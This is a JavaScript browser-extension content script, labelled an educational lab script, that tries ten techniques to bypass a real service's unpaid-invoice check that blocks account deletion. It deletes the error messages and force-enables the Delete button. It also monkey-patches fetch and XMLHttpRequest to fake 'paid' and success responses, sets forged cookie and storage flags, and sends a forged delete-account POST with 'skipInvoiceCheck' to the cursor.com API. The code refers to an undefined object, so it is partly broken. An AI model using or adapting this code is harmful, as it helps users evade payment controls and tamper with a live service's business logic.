// Bypass Delete with Invoice - Working Version
// Educational Lab Script

(function() {
    'use strict';
    
    console.log('🚀 [BYPASS] Script loaded successfully!');
    console.log('⚠️ [STATUS] Under Development - Results will be saved to /result/ folder');
    
    // Configuration
    const CONFIG = {
        exportPath: 'result/',
        version: '1.0.0',
        status: 'Under Development',
        autoExport: true
    };
    
    // Main bypass object
    const BypassInvoice = {
    
    // Start bypass testing
    async start() {
      console.log('\n' + '='.repeat(70));
      console.log('🔥 STARTING BYPASS TESTING - INVOICE VALIDATION');
      console.log('='.repeat(70));
      
      // Check current page
      console.log('📍 Current URL:', window.location.href);
      console.log('📄 Page Title:', document.title);
      
      // Look for modal
      const modal = document.querySelector('input[placeholder*="Delete"]');
      if (!modal) {
        console.log('⚠️ Delete modal not found! Opening it...');
        this.openModal();
        await this.delay(3000);
      } else {
        console.log('✅ Delete modal is open');
      }
      
      // Start testing techniques
      const results = [];
      
      // Technique 1: Remove Error Message
      console.log('\n📌 [Technique 1/10] Remove Error Message');
      const t1 = await this.technique1_RemoveError();
      results.push(t1);
      this.updateProgress(1, 10, t1);
      await this.delay(1000);
      
      // Technique 2: Fill Input Correctly
      console.log('\n📌 [Technique 2/10] Fill Input with "Delete"');
      const t2 = await this.technique2_FillInput();
      results.push(t2);
      this.updateProgress(2, 10, t2);
      await this.delay(1000);
      
      // Technique 3: Enable Delete Button
      console.log('\n📌 [Technique 3/10] Enable Delete Button');
      const t3 = await this.technique3_EnableButton();
      results.push(t3);
      this.updateProgress(3, 10, t3);
      await this.delay(1000);
      
      // Technique 4: Click Delete Button
      console.log('\n📌 [Technique 4/10] Click Delete Button');
      const t4 = await this.technique4_ClickDelete();
      results.push(t4);
      this.updateProgress(4, 10, t4);
      await this.delay(1000);
      
      // Technique 5: Override Validation
      console.log('\n📌 [Technique 5/10] Override Validation');
      const t5 = await this.technique5_OverrideValidation();
      results.push(t5);
      this.updateProgress(5, 10, t5);
      await this.delay(1000);
      
      // Technique 6: Manipulate Cookies
      console.log('\n📌 [Technique 6/10] Manipulate Cookies & Storage');
      const t6 = await this.technique6_ManipulateStorage();
      results.push(t6);
      this.updateProgress(6, 10, t6);
      await this.delay(1000);
      
      // Technique 7: Intercept Network
      console.log('\n📌 [Technique 7/10] Intercept Network Requests');
      const t7 = await this.technique7_InterceptNetwork();
      results.push(t7);
      this.updateProgress(7, 10, t7);
      await this.delay(1000);
      
      // Technique 8: Force Submit
      console.log('\n📌 [Technique 8/10] Force Form Submit');
      const t8 = await this.technique8_ForceSubmit();
      results.push(t8);
      this.updateProgress(8, 10, t8);
      await this.delay(1000);
      
      // Technique 9: Create Bypass Button
      console.log('\n📌 [Technique 9/10] Create Bypass Button');
      const t9 = await this.technique9_CreateBypassButton();
      results.push(t9);
      this.updateProgress(9, 10, t9);
      await this.delay(1000);
      
      // Technique 10: Final Attack
      console.log('\n📌 [Technique 10/10] Final Combined Attack');
      const t10 = await this.technique10_FinalAttack();
      results.push(t10);
      this.updateProgress(10, 10, t10);
      
      // Summary
      console.log('\n' + '='.repeat(70));
      console.log('📊 TESTING COMPLETE - RESULTS:');
      let success = 0, partial = 0, failed = 0;
      results.forEach((r, i) => {
        const icon = r.status === 'success' ? '✅' : r.status === 'partial' ? '⚠️' : '❌';
        console.log(`${i+1}. ${icon} ${r.technique}: ${r.description}`);
        if (r.status === 'success') success++;
        else if (r.status === 'partial') partial++;
        else failed++;
      });
      console.log(`\nTotal: ${success} Success, ${partial} Partial, ${failed} Failed`);
      console.log('='.repeat(70));
      
      // Copy results to clipboard as JSON
      await this.copyResultsToClipboard(results, success, partial, failed);
      
      return results;
    },
    
    // Open delete modal
    openModal() {
      const buttons = document.querySelectorAll('button');
      for (const btn of buttons) {
        if (btn.textContent.includes('Delete Account')) {
          console.log('Found Delete Account button, clicking...');
          btn.click();
          return;
        }
      }
    },
    
    // Update progress
    updateProgress(current, total, result) {
      try {
        chrome.runtime.sendMessage({
          type: 'updateBypassProgress',
          progress: current,
          total: total,
          current: `Technique ${current}`,
          result: result
        });
      } catch (e) {
        console.log('Progress update:', current + '/' + total);
      }
    },
    
    // Delay helper
    delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    },
    
    // Copy results to clipboard as JSON
    async copyResultsToClipboard(results, successCount, partialCount, failedCount) {
      const jsonData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        summary: {
          total_techniques: results.length,
          success: successCount,
          partial: partialCount,
          failed: failedCount,
          success_rate: `${((successCount / results.length) * 100).toFixed(1)}%`
        },
        techniques: results.map((r, index) => ({
          id: index + 1,
          technique: r.technique,
          status: r.status,
          description: r.description
        })),
        metadata: {
          script_version: '1.0',
          browser: navigator.userAgent,
          page_title: document.title
        }
      };
      
      const jsonString = JSON.stringify(jsonData, null, 2);
      
      try {
        // Try using navigator.clipboard API
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(jsonString);
          console.log('\n📋 Results copied to clipboard as JSON!');
          console.log('🔍 Preview:', jsonString.substring(0, 200) + '...');
          
          // Show visual notification
          this.showCopyNotification('✅ Results copied to clipboard!');
        } else {
          // Fallback method using textarea
          const textarea = document.createElement('textarea');
          textarea.value = jsonString;
          textarea.style.position = 'fixed';
          textarea.style.top = '-9999px';
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
          
          console.log('\n📋 Results copied to clipboard (fallback method)!');
          this.showCopyNotification('✅ Results copied to clipboard!');
        }
        
        // Also send to extension if available
        try {
          chrome.runtime.sendMessage({
            type: 'bypassResultsJSON',
            data: jsonData
          });
        } catch (e) {
          // Extension not available, ignore
        }
        
      } catch (error) {
        console.error('❌ Failed to copy to clipboard:', error);
        console.log('\n📝 JSON Results (copy manually):');
        console.log(jsonString);
      }
    },
    
    // Show copy notification
    showCopyNotification(message) {
      // Create notification element
      const notification = document.createElement('div');
      notification.textContent = message;
      notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 15px 25px;
        border-radius: 10px;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        font-size: 14px;
        font-weight: 600;
        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        z-index: 999999;
        animation: slideIn 0.3s ease-out;
        display: flex;
        align-items: center;
        gap: 10px;
      `;
      
      // Add animation
      const style = document.createElement('style');
      style.textContent = `
        @keyframes slideIn {
          from {
            transform: translateX(100%);
            opacity: 0;
          }
          to {
            transform: translateX(0);
            opacity: 1;
          }
        }
        @keyframes slideOut {
          from {
            transform: translateX(0);
            opacity: 1;
          }
          to {
            transform: translateX(100%);
            opacity: 0;
          }
        }
      `;
      document.head.appendChild(style);
      
      // Add to page
      document.body.appendChild(notification);
      
      // Remove after 3 seconds
      setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-out';
        setTimeout(() => {
          notification.remove();
          style.remove();
        }, 300);
      }, 3000);
    },
    
    // TECHNIQUE 1: Remove Error Message
    async technique1_RemoveError() {
      const errors = document.querySelectorAll('.bg-red-100, [class*="red"], [class*="error"]');
      let removed = 0;
      
      errors.forEach(el => {
        if (el.textContent.includes('invoice') || el.textContent.includes('pay')) {
          console.log('Removing error:', el.textContent.substring(0, 50));
          el.remove();
          removed++;
        }
      });
      
      return {
        technique: 'Remove Error',
        status: removed > 0 ? 'success' : 'failed',
        description: `Removed ${removed} error elements`
      };
    },
    
    // TECHNIQUE 2: Fill Input
    async technique2_FillInput() {
      const input = document.querySelector('input[placeholder*="Delete"]');
      
      if (!input) {
        return {
          technique: 'Fill Input',
          status: 'failed',
          description: 'Input not found'
        };
      }
      
      // Clear and fill with correct case
      input.value = '';
      input.focus();
      
      // Type "Delete" with capital D
      const word = 'Delete';
      for (let i = 0; i < word.length; i++) {
        input.value += word[i];
        input.dispatchEvent(new Event('input', { bubbles: true }));
      }
      
      input.dispatchEvent(new Event('change', { bubbles: true }));
      console.log('Input filled with:', input.value);
      
      return {
        technique: 'Fill Input',
        status: 'success',
        description: 'Filled with "Delete"'
      };
    },
    
    // TECHNIQUE 3: Enable Button
    async technique3_EnableButton() {
      let enabledCount = 0;
      
      document.querySelectorAll('button').forEach(btn => {
        if (btn.textContent.includes('Delete') && !btn.textContent.includes('Account')) {
          btn.disabled = false;
          btn.removeAttribute('disabled');
          btn.removeAttribute('aria-disabled');
          btn.setAttribute('aria-disabled', 'false');
          btn.style.pointerEvents = 'auto';
          btn.style.opacity = '1';
          enabledCount++;
          console.log('Enabled button:', btn.textContent);
        }
      });
      
      return {
        technique: 'Enable Button',
        status: enabledCount > 0 ? 'success' : 'failed',
        description: `Enabled ${enabledCount} buttons`
      };
    },
    
    // TECHNIQUE 4: Click Delete
    async technique4_ClickDelete() {
      const deleteBtn = Array.from(document.querySelectorAll('button')).find(
        btn => btn.textContent.trim() === 'Delete'
      );
      
      if (!deleteBtn) {
        return {
          technique: 'Click Delete',
          status: 'failed',
          description: 'Delete button not found'
        };
      }
      
      // Multiple click methods
      deleteBtn.click();
      deleteBtn.dispatchEvent(new MouseEvent('click', { bubbles: true }));
      deleteBtn.dispatchEvent(new PointerEvent('click', { bubbles: true }));
      
      console.log('Clicked delete button');
      
      return {
        technique: 'Click Delete',
        status: 'success',
        description: 'Clicked delete button 3 times'
      };
    },
    
    // TECHNIQUE 5: Override Validation
    async technique5_OverrideValidation() {
      // Override global functions
      window.validatePayment = () => true;
      window.checkInvoice = () => false;
      window.hasOutstandingInvoices = () => false;
      
      // Override fetch for validation
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const url = args[0];
        console.log('Intercepting fetch:', url);
        
        if (url.includes('invoice') || url.includes('payment')) {
          return Promise.resolve({
            ok: true,
            json: () => Promise.resolve({ paid: true, outstanding: false })
          });
        }
        
        return originalFetch.apply(this, args);
      };
      
      return {
        technique: 'Override Validation',
        status: 'success',
        description: 'Validation functions overridden'
      };
    },
    
    // TECHNIQUE 6: Manipulate Storage
    async technique6_ManipulateStorage() {
      // Set bypass flags
      localStorage.setItem('invoicesPaid', 'true');
      localStorage.setItem('bypassInvoice', 'true');
      sessionStorage.setItem('forceDelete', 'true');
      
      // Set cookies
      document.cookie = 'invoice_paid=true;path=/';
      document.cookie = 'bypass_validation=true;path=/';
      
      console.log('Storage and cookies set');
      
      return {
        technique: 'Manipulate Storage',
        status: 'success',
        description: 'Storage flags and cookies set'
      };
    },
    
    // TECHNIQUE 7: Intercept Network
    async technique7_InterceptNetwork() {
      // Already done in technique 5, but let's add more
      
      // Override XMLHttpRequest
      const originalOpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        console.log('XHR intercepted:', method, url);
        
        if (url.includes('delete')) {
          this.addEventListener('load', function() {
            if (this.status >= 400) {
              Object.defineProperty(this, 'status', { value: 200 });
              Object.defineProperty(this, 'responseText', { 
                value: JSON.stringify({ success: true }) 
              });
            }
          });
        }
        
        return originalOpen.apply(this, [method, url, ...rest]);
      };
      
      return {
        technique: 'Intercept Network',
        status: 'success',
        description: 'Network layer intercepted'
      };
    },
    
    // TECHNIQUE 8: Force Submit
    async technique8_ForceSubmit() {
      const deleteBtn = Array.from(document.querySelectorAll('button')).find(
        btn => btn.textContent.trim() === 'Delete'
      );
      
      if (!deleteBtn) {
        return {
          technique: 'Force Submit',
          status: 'failed',
          description: 'No delete button to submit'
        };
      }
      
      // Find parent form or div
      const container = deleteBtn.closest('div[class*="modal"], div[class*="relative"]');
      
      if (container) {
        // Create and dispatch submit event
        const submitEvent = new Event('submit', { bubbles: true, cancelable: false });
        container.dispatchEvent(submitEvent);
        
        // Try form submit if it's a form
        if (container.tagName === 'FORM') {
          container.submit();
        }
      }
      
      // Force click again
      deleteBtn.click();
      
      return {
        technique: 'Force Submit',
        status: 'partial',
        description: 'Dispatched submit events'
      };
    },
    
    // TECHNIQUE 9: Create Bypass Button
    async technique9_CreateBypassButton() {
      const modal = document.querySelector('div[class*="relative"][class*="flex"]');
      
      if (!modal) {
        return {
          technique: 'Create Bypass Button',
          status: 'failed',
          description: 'Modal not found'
        };
      }
      
      // Check if button already exists
      if (document.getElementById('bypass-force-delete')) {
        return {
          technique: 'Create Bypass Button',
          status: 'partial',
          description: 'Button already exists'
        };
      }
      
      // Create force delete button
      const forceBtn = document.createElement('button');
      forceBtn.id = 'bypass-force-delete';
      forceBtn.textContent = '🔥 FORCE DELETE (BYPASS)';
      forceBtn.style.cssText = `
        background: linear-gradient(45deg, #ff0000, #ff6600);
        color: white;
        padding: 12px 24px;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        margin: 10px;
        font-size: 14px;
        box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        transition: all 0.3s;
      `;
      
      forceBtn.onmouseover = () => {
        forceBtn.style.transform = 'scale(1.05)';
      };
      
      forceBtn.onmouseout = () => {
        forceBtn.style.transform = 'scale(1)';
      };
      
      forceBtn.onclick = async () => {
        console.log('🔥 FORCE DELETE CLICKED!');
        
        // Remove all errors
        document.querySelectorAll('[class*="error"], [class*="red"]').forEach(e => e.remove());
        
        // Fill input
        const input = document.querySelector('input[placeholder*="Delete"]');
        if (input) input.value = 'Delete';
        
        // Enable and click original delete
        const deleteBtn = Array.from(document.querySelectorAll('button')).find(
          btn => btn.textContent.trim() === 'Delete'
        );
        
        if (deleteBtn) {
          deleteBtn.disabled = false;
          deleteBtn.click();
        }
        
        // Try API call
        try {
          const response = await fetch('https://cursor.com/api/dashboard/delete-account', {
            method: 'POST',
            credentials: 'include',
            headers: {
              'Content-Type': 'application/json',
              'X-Force-Delete': 'true'
            },
            body: JSON.stringify({ 
              confirmation: 'Delete',
              force: true,
              skipInvoiceCheck: true 
            })
          });
          console.log('API Response:', response.status);
        } catch (e) {
          console.log('API Error:', e);
        }
      };
      
      modal.appendChild(forceBtn);
      console.log('Force delete button created');
      
      return {
        technique: 'Create Bypass Button',
        status: 'success',
        description: 'Force delete button added'
      };
    },
    
    // TECHNIQUE 10: Final Attack
    async technique10_FinalAttack() {
      console.log('🔥 FINAL ATTACK - EVERYTHING AT ONCE!');
      
      // Remove all errors
      document.querySelectorAll('[class*="error"], [class*="red"]').forEach(e => e.remove());
      
      // Fill input
      const input = document.querySelector('input[placeholder*="Delete"]');
      if (input) {
        input.value = 'Delete';
        input.dispatchEvent(new Event('input', { bubbles: true }));
      }
      
      // Enable all buttons
      document.querySelectorAll('button').forEach(btn => {
        btn.disabled = false;
        btn.removeAttribute('disabled');
        btn.removeAttribute('aria-disabled');
      });
      
      // Find and assault delete button
      const deleteBtn = Array.from(document.querySelectorAll('button')).find(
        btn => btn.textContent.trim() === 'Delete'
      );
      
      if (deleteBtn) {
        // Multi-click attack
        for (let i = 0; i < 10; i++) {
          await this.delay(100);
          deleteBtn.click();
        }
        
        return {
          technique: 'Final Attack',
          status: 'success',
          description: 'Executed 10 rapid clicks'
        };
      }
      
      return {
        technique: 'Final Attack',
        status: 'failed',
        description: 'Delete button not found'
      };
    }
  };
  
  // Auto-execute when message received
  chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    console.log('📨 Message received:', request.type);
    
    if (request.type === 'executeDeleteBypass' || request.type === 'executeBypassTests') {
      console.log('🚀 Starting bypass execution...');
      
      // Execute bypass
      Bypass.start().then(results => {
        console.log('✅ Bypass complete, sending results');
        sendResponse({ success: true, results: results });
      }).catch(error => {
        console.error('❌ Bypass error:', error);
        sendResponse({ success: false, error: error.message });
      });
      
      return true; // Keep message channel open
    }
  });
  
  // Expose to window for manual testing
  window.BypassInvoice = Bypass;
  console.log('💡 Manual test: window.BypassInvoice.start()');
  
  // Show ready message
  console.log('✅ [BYPASS] Ready to execute!');
  
})();
